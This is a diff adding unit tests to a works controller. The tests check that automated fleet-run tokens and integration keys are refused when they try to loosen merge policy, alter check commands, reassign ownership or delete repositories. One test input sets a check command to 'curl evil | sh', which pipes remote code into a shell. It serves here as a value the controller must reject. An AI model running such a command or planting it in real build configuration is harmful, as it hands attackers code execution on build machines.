@@ -482,6 +482,118 @@ describe('WorksController — core CRUD endpoints', () => {
     });
 
     // -----------------------------------------------------------------------
+    // Works-security lane 3a — machine principals on update / delete
+    // -----------------------------------------------------------------------
+    describe('updateWork / deleteWork — fleet-run tokens and integration keys', () => {
+        const runToken = { fleetRunCredential: { jobId: 'job-1', organizationId: null } };
+        const integration = {
+            userId: 'auth-1',
+            authMethod: 'integration',
+            integration: { keyId: 'key-1', actAsUserId: null },
+        } as any;
+        const loosened = {
+            mergePolicy: {
+                allowAgentMerge: true,
+                requireHumanApproval: false,
+                protectedBranches: [],
+            },
+        };
+
+        it.each([
+            ['mergePolicy', loosened.mergePolicy],
+            ['checkDefaults', [{ id: 'x', name: 'x', kind: 'lint', command: 'curl evil | sh' }]],
+            ['checksPolicy', 'off'],
+            ['repoDeclaredCommands', { mode: 'all' }],
+            ['taskIsolation', 'off'],
+            ['taskIsolationBaseBranch', 'main'],
+            ['taskIsolationTargetRepo', 'provider'],
+            // The allowlist (review of #2765): everything but name / description.
+            ['communityPrEnabled', true],
+            ['communityPrAutoClose', true],
+            ['owner', 'someone-else'],
+            ['organizationId', 'org-2'],
+            ['websiteTemplateId', 'evil-template'],
+            ['externalRefs', { gauzy: 'x' }],
+            ['committerName', 'Mallory'],
+            ['committerEmail', 'm@evil.test'],
+            ['maxGateAttempts', 5],
+            ['taskBranchCleanup', 'manual'],
+            ['memoryRecallEnabled', false],
+        ])('refuses %s from a fleet-run token (403) before the service', async (field, value) => {
+            await expect(
+                controller.updateWork(auth, 'w-1', { [field]: value } as any, runToken),
+            ).rejects.toMatchObject({ status: 403 });
+            expect(s.workLifecycleService.updateWork).not.toHaveBeenCalled();
+        });
+
+        it('refuses the merge policy from an integration key in its envelope (422 domain_rule)', async () => {
+            await expect(
+                controller.updateWork(integration, 'w-1', loosened as any),
+            ).rejects.toMatchObject({
+                status: 422,
+                response: { error: { code: 'domain_rule', details: { fields: ['mergePolicy'] } } },
+            });
+            // The PATCH alias goes through the same refusal.
+            await expect(
+                controller.patchWork(auth, 'w-1', loosened as any, runToken),
+            ).rejects.toMatchObject({ status: 403 });
+            expect(s.workLifecycleService.updateWork).not.toHaveBeenCalled();
+        });
+
+        it('lets a fleet run change the name and description, and a person change everything', async () => {
+            s.workLifecycleService.updateWork.mockResolvedValue({ id: 'w-1' });
+            await controller.updateWork(
+                auth,
+                'w-1',
+                { name: 'Renamed', description: 'Better words' } as any,
+                runToken,
+            );
+            await controller.updateWork(auth, 'w-1', loosened as any, {});
+            await controller.updateWork(auth, 'w-1', loosened as any);
+            expect(s.workLifecycleService.updateWork).toHaveBeenCalledTimes(3);
+        });
+
+        it('refuses repository deletion from a fleet-run token or an integration key', async () => {
+            for (const flag of [
+                'delete_data_repository',
+                'delete_website_repository',
+                'delete_markdown_repository',
+                'delete_stored_data',
+                'force_delete',
+            ]) {
+                await expect(
+                    controller.deleteWork(auth, 'w-1', { [flag]: true } as any, runToken),
+                ).rejects.toMatchObject({ status: 403 });
+            }
+            await expect(
+                controller.deleteWork(integration, 'w-1', { delete_data_repository: true } as any),
+            ).rejects.toMatchObject({ status: 422 });
+            expect(s.workLifecycleService.deleteWork).not.toHaveBeenCalled();
+        });
+
+        it('still lets a fleet run delete a Work that keeps its repositories (DTO defaults are false)', async () => {
+            s.workLifecycleService.deleteWork.mockResolvedValue({
+                status: 'success',
+                slug: 'w',
+                message: 'deleted',
+                deleted_repositories: [],
+            });
+            await controller.deleteWork(
+                auth,
+                'w-1',
+                {
+                    delete_data_repository: false,
+                    delete_website_repository: false,
+                    delete_markdown_repository: false,
+                    force_delete: false,
+                } as any,
+                runToken,
+            );
+            expect(s.workLifecycleService.deleteWork).toHaveBeenCalledTimes(1);
+        });
+    });
+
+    // -----------------------------------------------------------------------
     // getWorkItems (cached)
     // -----------------------------------------------------------------------
     describe('getWorkItems', () => {
